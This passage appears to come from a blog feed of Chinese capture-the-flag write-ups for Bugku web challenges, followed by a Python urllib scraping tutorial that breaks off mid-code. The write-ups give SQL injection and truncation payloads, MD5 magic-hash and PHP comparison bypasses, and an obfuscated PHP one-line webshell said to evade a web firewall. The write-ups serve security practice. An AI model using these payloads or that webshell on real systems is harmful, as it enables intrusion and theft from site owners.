      <link href="/2018/08/09/Writeup/WP-Bugku-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86/"/>
      <url>/2018/08/09/Writeup/WP-Bugku-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86/</url>
      <content type="html"><![CDATA[<p>题目地址：<a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">http://120.24.86.145:9001/sql/</a></p><p>寻找注入点，找到<code>1&quot;</code>双引号会报错<br><img src="https://i.imgur.com/x9z5SYO.png" alt=""></p><p>order by判断字段数：<br><code>1&quot;order by 1,2,3--</code></p><p>找表：<br><code>1&quot; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--</code><br><img src="https://i.imgur.com/dIPRsuy.png" alt=""><br>根据提示，得到表flag1，whoami</p><p>继续找列<br><code>1&quot; union select group_concat(column_name),2 from information_schema.columns where table_name=&#39;flag1&#39;--</code><br><img src="https://i.imgur.com/evQXsji.png" alt=""></p><p>找字段<br><code>1&quot; union select flag1,2 from flag1--</code></p><p>得到Login_Name:ed6b28e684817d9efcaf802979e57aea</p><p>flag{ed6b28e684817d9efcaf802979e57aea}</p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-login1(SKCTF)</title>
      <link href="/2018/08/09/Writeup/WP-Bugku-login1-SKCTF/"/>
      <url>/2018/08/09/Writeup/WP-Bugku-login1-SKCTF/</url>
      <content type="html"><![CDATA[<p>题目地址：<a href="http://118.89.219.210:49163/" target="_blank" rel="noopener">http://118.89.219.210:49163/</a></p><p>本文转载自：<a href="https://delcoding.github.io/2018/03/bugku-writeup4/" target="_blank" rel="noopener">https://delcoding.github.io/2018/03/bugku-writeup4/</a></p><p>这道题用的是sql约束攻击，利用的是数据库字段定义时产生的漏洞。如：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE<span class="built_in"> users </span>(</span><br><span class="line">    -&gt;   username varchar(25),</span><br><span class="line">    -&gt;   password varchar(25)</span><br><span class="line">    -&gt; );</span><br></pre></td></tr></table></figure></p><p>这里的username只允许25个字符，超过后就舍去25字符以后的，然后在mysql中，admin跟admin [很多空格]在查询的时候是一样的。因为admin用户已经存在，但我们不知道他的密码，所以我们自己注册一个admin然后替换掉密码。所以我们可以注册一个admin[很多个空格]1的用户名，只要总字符数超过25，然后密码设成你的。注册成功后使用admin加你的密码去登陆即可得到flag。</p><p>SKCTF{4Dm1n_HaV3_GreAt_p0w3R} </p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
            <tag> SQL约束攻击 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-多次</title>
      <link href="/2018/08/09/Writeup/WP-Bugku-%E5%A4%9A%E6%AC%A1/"/>
      <url>/2018/08/09/Writeup/WP-Bugku-%E5%A4%9A%E6%AC%A1/</url>
      <content type="html"><![CDATA[<p>题目地址：<a href="http://120.24.86.145:9004/" target="_blank" rel="noopener">http://120.24.86.145:9004/</a></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-md5 collision(NUPT_CTF)</title>
      <link href="/2018/08/09/Writeup/WP-Bugku-md5-collision-NUPT-CTF/"/>
      <url>/2018/08/09/Writeup/WP-Bugku-md5-collision-NUPT-CTF/</url>
      <content type="html"><![CDATA[<p>题目地址：<a href="http://120.24.86.145:9009/md5.php" target="_blank" rel="noopener">http://120.24.86.145:9009/md5.php</a></p><p>md5 collision（MD5碰撞）：本段转自<a href="https://www.jianshu.com/p/2791e2fdadfd" target="_blank" rel="noopener">https://www.jianshu.com/p/2791e2fdadfd</a></p><ul><li>MD5摘要算法可以从多个字节组成的串中计算出由32个字节构成的“特征串”，对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在不同的串能够得出相同MD5值的情况，即碰撞。</li><li>在PHP中的MD5中的0e的比较：PHP在处理哈希字符串时，会利用“！=”或“==”来对哈希值进行比较，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。</li></ul><p>这里给出常用的0e开头的MD5：<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0</span>e830400451993494058<span class="number">024219903391</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0</span>e5459932745177090343<span class="number">28855841020</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0</span>e8482404488305379244<span class="number">65865611904</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0</span>e8482404488305379244<span class="number">65865611904</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0</span>e5459932745177090343<span class="number">28855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0</span>e4810364908676611132<span class="number">60034900752</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0</span>e072485820392773389<span class="number">523109082030</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0</span>e731198061491163073<span class="number">197128363787</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0</span>e4810364908676611132<span class="number">60034900752</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0</span>e731198061491163073<span class="number">197128363787</span></span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0</span>e342768416822451524<span class="number">974117254469</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0</span>e4810364908676611132<span class="number">60034900752</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0</span>e220463095855511507<span class="number">588041205815</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0</span>e5459932745177090343<span class="number">28855841020</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0</span>e8482404488305379244<span class="number">65865611904</span></span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0</span>e8615801632915612474<span class="number">04381396064</span></span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0</span>e9406242178565615578<span class="number">16327384675</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0</span>e731198061491163073<span class="number">197128363787</span></span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0</span>e5093672134182067008<span class="number">42008763514</span></span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0</span>e4810364908676611132<span class="number">60034900752</span></span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0</span>e731198061491163073<span class="number">197128363787</span></span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0</span>e5459932745177090343<span class="number">28855841020</span></span><br></pre></td></tr></table></figure></p><p>抓包测试得到flag{md5_collision_is_easy}<br><img src="https://i.imgur.com/DkQe2JO.png" alt=""></p><hr>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-前女友(SKCTF)</title>
      <link href="/2018/08/08/Writeup/WP-Bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B(SKCTF)/"/>
      <url>/2018/08/08/Writeup/WP-Bugku-%E5%89%8D%E5%A5%B3%E5%8F%8B(SKCTF)/</url>
      <content type="html"><![CDATA[<p>题目链接：<a href="http://118.89.219.210:49162/" target="_blank" rel="noopener">http://118.89.219.210:49162/</a></p><p>打开题目后有一堆文字，查看源码，有一个链接，点进去后得到源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $v1 = $_GET[<span class="string">'v1'</span>];</span></span><br><span class="line"><span class="php">    $v2 = $_GET[<span class="string">'v2'</span>];</span></span><br><span class="line"><span class="php">    $v3 = $_GET[<span class="string">'v3'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p><font color="red">在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null</font>,这样就得到答案了。</p><p>所以构造出参数：<br><code>?v1[]=1&amp;v2[]=2&amp;v3[]=3</code><br>url:<br><a href="http://118.89.219.210:49162/?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3" target="_blank" rel="noopener">http://118.89.219.210:49162/?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3</a></p><p>得到SKCTF{Php_1s_tH3_B3St_L4NgUag3}</p><hr>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Bugku </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-字符?正则?</title>
      <link href="/2018/08/08/Writeup/WP-Bugku-%E5%AD%97%E7%AC%A6-%E6%AD%A3%E5%88%99/"/>
      <url>/2018/08/08/Writeup/WP-Bugku-%E5%AD%97%E7%AC%A6-%E6%AD%A3%E5%88%99/</url>
      <content type="html"><![CDATA[<p>题目代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">highlight_file(<span class="string">'2.php'</span>);</span></span><br><span class="line"><span class="php">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span></span><br><span class="line"><span class="php">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $IM )&#123; </span></span><br><span class="line"><span class="php">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>可以看到<code>/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i</code>这一串正则表达式<br><a href="#1"><font color="darkred">(关于正则点这里)</font></a><br>能够构造出：<br><code>?id=key1key22222key:/3/keyz;</code></p><p>构造url：<br><a href="http://120.24.86.145:8002/web10/?id=key1key22222key:/3/keyz" target="_blank" rel="noopener">http://120.24.86.145:8002/web10/?id=key1key22222key:/3/keyz</a>;</p><p>得到KEY{0x0SIOPh550afc}</p><hr><p><div id="1"></div></p><h3 id="正则表达的整理："><a href="#正则表达的整理：" class="headerlink" title="正则表达的整理："></a>正则表达的整理：</h3><pre><code>1.表达式直接写出来的字符串直接利用，如key2.“.”代表任意字符3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次，这里可以是0次，还有就是以&apos;^&apos;开头，以&apos;$&apos;结束4.“\/”代表“/”，一种转义，因为单独的//代表着正则的开始与结束5.[a-z]代表a-z中的任意一个字符6.[[:punct:]]代表任意一个字符，包括各种符号，记得是符号7./i代表大小写不敏感8.{4-7}代表[0-9]中数字连续出现的次数是4-7次9.\s匹配任意的空白符10.\d   匹配数字11.\b   匹配单词的开始或结束</code></pre><hr>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Bugku </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WP-Bugku-过狗一句话</title>
      <link href="/2018/08/08/Writeup/WP-Bugku-%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
      <url>/2018/08/08/Writeup/WP-Bugku-%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
      <content type="html"><![CDATA[<p>题目地址：<a href="http://120.24.86.145:8010/" target="_blank" rel="noopener">http://120.24.86.145:8010/</a></p><p>送给大家一个过狗一句话：<br><code>&lt;?php $poc=&quot;a#s#s#e#r#t&quot;;$poc_1=explode(&quot;#&quot;,$poc);$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];$poc_2($_GET[&#39;s&#39;])?&gt;</code></p><p>搜索到的几种解法：</p><pre><code>1. s=print_r(scandir(&apos;./&apos;))http://120.24.86.145:8010/?s=print_r(scandir(&apos;./&apos;))2. s=print_r(glob(&quot;*.*&quot;))http://120.24.86.145:8010/?s=print_r(glob(&quot;*.*&quot;))</code></pre><p>scandir()函数：</p><blockquote><p>scandir() 函数返回指定目录中的文件和目录的数组。<br><img src="https://i.imgur.com/FpX8LXY.png" alt=""><br>glob()函数：<br>glob() 函数返回匹配指定模式的文件名或目录。<br>该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。<br><img src="https://i.imgur.com/VXFVlN9.png" alt=""></p></blockquote>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python3抓取页面内容</title>
      <link href="/2018/08/08/python3%E6%8A%93%E5%8F%96%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9/"/>
      <url>/2018/08/08/python3%E6%8A%93%E5%8F%96%E9%A1%B5%E9%9D%A2%E5%86%85%E5%AE%B9/</url>
      <content type="html"><![CDATA[<font color="DarkViolet" size="5"><center><strong>环境：python3</strong></center></font><hr><h2 id="最简单"><a href="#最简单" class="headerlink" title="最简单"></a>最简单</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">response = urllib<span class="selector-class">.request</span><span class="selector-class">.urlopen</span>(<span class="string">'http://python.org/'</span>)</span><br><span class="line"><span class="selector-tag">html</span> = response.read()</span><br></pre></td></tr></table></figure><hr><h2 id="使用request"><a href="#使用request" class="headerlink" title="使用request"></a>使用request</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request, urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line">req = Request(<span class="string">"http://twitter.com/"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  response = urlopen(req)</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">  <span class="keyword">if</span> hasattr(e, <span class="string">'reason'</span>):</span><br><span class="line">    print(<span class="string">'We failed to reach a server.'</span>)</span><br><span class="line">    print(<span class="string">'Reason: '</span>, e.reason)</span><br><span class="line">  <span class="keyword">elif</span> hasattr(e, <span class="string">'code'</span>):</span><br><span class="line">    print(<span class="string">'The server couldn\'t fulfill the request.'</span>)</span><br><span class="line">    print(<span class="string">'Error code: '</span>, e.code)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  print(<span class="string">"good!"</span>)</span><br><span class="line">  print(response.read().decode(<span class="string">"utf8"</span>))</span><br></pre></td></tr></table></figure><hr><h2 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python3</span><br><span class="line">  </span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line">url = <span class="string">'http://localhost/login.php'</span></span><br><span class="line">user_agent = <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span></span><br><span class="line">values = &#123;</span><br><span class="line">     <span class="string">'act'</span> : <span class="string">'login'</span>,</span><br><span class="line">     <span class="string">'login[email]'</span> : <span class="string">'yzhang@i9i8.com'</span>,</span><br><span class="line">     <span class="string">'login[password]'</span> : <span class="string">'123456'</span></span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">data = urllib<span class="selector-class">.parse</span><span class="selector-class">.urlencode</span>(values)</span><br><span class="line">req = urllib<span class="selector-class">.request</span><span class="selector-class">.Request</span>(url, data)</span><br><span class="line">req.add_header(<span class="string">'Referer'</span>, <span class="string">'http://www.python.org/'</span>)</span><br><span class="line">response = urllib<span class="selector-class">.request</span><span class="selector-class">.urlopen</span>(req)</span><br><span class="line">the_page = response.read()</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(the_page.decode(<span class="string">"utf8"</span>)</span></span>)</span><br></pre></td></tr></table></figure><hr><h2 id="发送数据和header"><a href="#发送数据和header" class="headerlink" title="发送数据和header"></a>发送数据和header</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python3</span><br><span class="line">  </span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line">url = <span class="string">'http://localhost/login.php'</span></span><br><span class="line">user_agent = <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span></span><br><span class="line">values = &#123;</span><br><span class="line">     <span class="string">'act'</span> : <span class="string">'login'</span>,</span><br><span class="line">     <span class="string">'login[email]'</span> : <span class="string">'yzhang@i9i8.com'</span>,</span><br><span class="line">     <span class="string">'login[password]'</span> : <span class="string">'123456'</span></span><br><span class="line">     &#125;</span><br><span class="line">headers = &#123; <span class="string">'User-Agent'</span> : user_agent &#125;</span><br><span class="line">  </span><br><span class="line">data = urllib<span class="selector-class">.parse</span><span class="selector-class">.urlencode</span>(values)</span><br><span class="line">req = urllib<span class="selector-class">.request</span><span class="selector-class">.Request</span>(url, data, headers)</span><br><span class="line">response = urllib<span class="selector-class">.request</span><span class="selector-class">.urlopen</span>(req)</span><br><span class="line">the_page = response.read()</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(the_page.decode(<span class="string">"utf8"</span>)</span></span>)</span><br></pre></td></tr></table></figure><hr><h2 id="HTTP错误"><a href="#HTTP错误" class="headerlink" title="HTTP错误"></a>HTTP错误</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python3</span><br><span class="line">  </span><br><span class="line">import urllib.request</span><br><span class="line">  </span><br><span class="line">req = urllib<span class="selector-class">.request</span><span class="selector-class">.Request</span>(<span class="string">'http://www.python.org/fish.html'</span>)</span><br><span class="line">try:</span><br><span class="line">  urllib<span class="selector-class">.request</span><span class="selector-class">.urlopen</span>(req)</span><br><span class="line">except urllib<span class="selector-class">.error</span><span class="selector-class">.HTTPError</span> as e:</span><br><span class="line">  print(e.code)</span><br><span class="line">  print(e.read().decode(<span class="string">"utf8"</span>))</span><br></pre></td></tr></table></figure><hr><h2 id="异常处理1"><a href="#异常处理1" class="headerlink" title="异常处理1"></a>异常处理1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request, urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError, HTTPError</span><br><span class="line">req = Request(<span class="string">"http://twitter.com/"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  response = urlopen(req)</span><br><span class="line"><span class="keyword">except</span> HTTPError <span class="keyword">as</span> e:</span><br><span class="line">  print(<span class="string">'The server couldn\'t fulfill the request.'</span>)</span><br><span class="line">  print(<span class="string">'Error code: '</span>, e.code)</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">  print(<span class="string">'We failed to reach a server.'</span>)</span><br><span class="line">  print(<span class="string">'Reason: '</span>, e.reason)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  print(<span class="string">"good!"</span>)</span><br><span class="line">  print(response.read().decode(<span class="string">"utf8"</span>))</span><br></pre></td></tr></table></figure><hr><h2 id="异常处理2"><a href="#异常处理2" class="headerlink" title="异常处理2"></a>异常处理2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> Request, urlopen</span><br><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line">req = Request(<span class="string">"http://twitter.com/"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  response = 